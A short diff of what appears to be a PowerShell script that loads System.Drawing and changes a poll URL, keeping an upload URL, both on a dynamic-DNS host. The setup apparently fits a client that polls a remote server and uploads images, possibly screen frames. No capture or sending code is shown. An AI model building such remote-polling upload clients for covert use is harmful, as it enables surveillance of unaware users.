@@ -69,7 +69,7 @@ Add-Type -AssemblyName System.Drawing
 
 Log "09 System.Drawing loaded"
 
-$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
+$VPS_POLL_URL = "http://runx.ddns.net/api/poll_frames"
 $VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"
 
 Log "10 Poll URL: $VPS_POLL_URL"
